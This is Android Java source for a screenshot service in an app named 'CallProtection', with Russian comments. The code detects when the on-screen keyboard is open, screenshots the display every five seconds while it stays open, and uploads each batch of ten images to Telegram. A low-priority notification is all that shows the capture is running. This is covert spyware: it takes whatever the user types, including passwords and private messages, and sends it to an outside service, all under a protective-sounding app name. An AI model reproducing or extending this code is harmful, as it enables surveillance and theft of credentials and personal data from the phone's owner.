package com.daria.callprotection;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Rect;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.view.ViewTreeObserver;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;

public class ScreenshotService extends Service {
    private static final String TAG = "ScreenshotService";
    private static final String CHANNEL_ID = "screenshot_service_channel";
    private static final int NOTIF_ID = 102;
    private static final int BATCH_SIZE = 10;
    private static final int SCREENSHOT_INTERVAL = 5000; // 5 секунд

    private MediaProjection mediaProjection;
    private ImageReader imageReader;
    private Handler handler;
    private HandlerThread handlerThread;

    private int width;
    private int height;
    private int density;

    private final List<File> screenshotBatch = new ArrayList<>();

    private MediaProjectionManager projectionManager;
    private int resultCode;
    private Intent resultData;

    private boolean isKeyboardVisible = false;
    private Handler screenshotHandler = new Handler();
    private Runnable screenshotRunnable = new Runnable() {
        @Override
        public void run() {
            if (isKeyboardVisible) {
                captureScreenshot();
                screenshotHandler.postDelayed(this, SCREENSHOT_INTERVAL);
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification("Сервис скриншотов запущен"));

        handlerThread = new HandlerThread("ScreenshotHandlerThread");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());

        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        if (wm != null && wm.getDefaultDisplay() != null) {
            wm.getDefaultDisplay().getMetrics(metrics);
            width = metrics.widthPixels;
            height = metrics.heightPixels;
            density = metrics.densityDpi;
        }

        projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);

        // Отслеживание клавиатуры
        trackKeyboardVisibility();
    }

    private void trackKeyboardVisibility() {
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        View rootView = new View(this);
        wm.addView(rootView, new WindowManager.LayoutParams());

        rootView.getViewTreeObserver().addOnGlobalLayoutListener(() -> {
            Rect r = new Rect();
            rootView.getWindowVisibleDisplayFrame(r);
            int screenHeight = rootView.getRootView().getHeight();
            int keypadHeight = screenHeight - r.bottom;

            boolean visible = keypadHeight > screenHeight * 0.15; // 15% высоты экрана
            if (visible != isKeyboardVisible) {
                isKeyboardVisible = visible;
                if (isKeyboardVisible) {
                    Log.i(TAG, "Клавиатура открыта, запускаем скрины");
                    screenshotHandler.post(screenshotRunnable);
                } else {
                    Log.i(TAG, "Клавиатура закрыта, останавливаем скрины");
                    screenshotHandler.removeCallbacks(screenshotRunnable);
                }
            }
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            resultCode = intent.getIntExtra("resultCode", -1);
            resultData = intent.getParcelableExtra("resultData");

            if (mediaProjection == null && resultCode != -1 && resultData != null) {
                mediaProjection = projectionManager.getMediaProjection(resultCode, resultData);
                setupImageReader();
                Log.i(TAG, "MediaProjection запущен");
            }
        }
        return START_STICKY;
    }

    private void setupImageReader() {
        imageReader = ImageReader.newInstance(width, height, 0x1, 2);
        mediaProjection.createVirtualDisplay(
                "ScreenCapture",
                width,
                height,
                density,
                0,
                imageReader.getSurface(),
                null,
                handler
        );
    }

    private void captureScreenshot() {
        try (Image image = imageReader.acquireLatestImage()) {
            if (image == null) return;

            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();

            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);

            File file = saveBitmapToFile(bitmap);
            bitmap.recycle();

            if (file != null) {
                screenshotBatch.add(file);
                Log.i(TAG, "Скриншот сохранён: " + file.getAbsolutePath());

                if (screenshotBatch.size() >= BATCH_SIZE) {
                    sendBatchToTelegram();
                    screenshotBatch.clear();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Ошибка скриншота", e);
        }
    }

    private File saveBitmapToFile(Bitmap bitmap) {
        try {
            File dir = new File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "screenshots");
            if (!dir.exists() && !dir.mkdirs()) {
                Log.e(TAG, "Не удалось создать директорию для скриншотов");
                return null;
            }

            String filename = "screenshot_" + System.currentTimeMillis() + ".png";
            File file = new File(dir, filename);

            try (FileOutputStream fos = new FileOutputStream(file)) {
                bitmap.compress(Bitmap.CompressFormat.PNG, 90, fos);
                fos.flush();
            }

            return file;
        } catch (Exception e) {
            Log.e(TAG, "Ошибка сохранения файла скриншота", e);
            return null;
        }
    }

    private void sendBatchToTelegram() {
        Log.i(TAG, "Отправляем пачку скриншотов (" + screenshotBatch.size() + ") в Telegram");
        for (File f : screenshotBatch) {
            TelegramUploader.uploadFile(getApplicationContext(), f, "Скриншот экрана");
        }
    }

    private Notification buildNotification(String text) {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("CallProtection")
                .setContentText(text)
                .setSmallIcon(R.drawable.ic_notification)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Сервис снятия скриншотов",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (handlerThread != null) {
            handlerThread.quitSafely();
            handlerThread = null;
        }
        screenshotHandler.removeCallbacks(screenshotRunnable);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
            
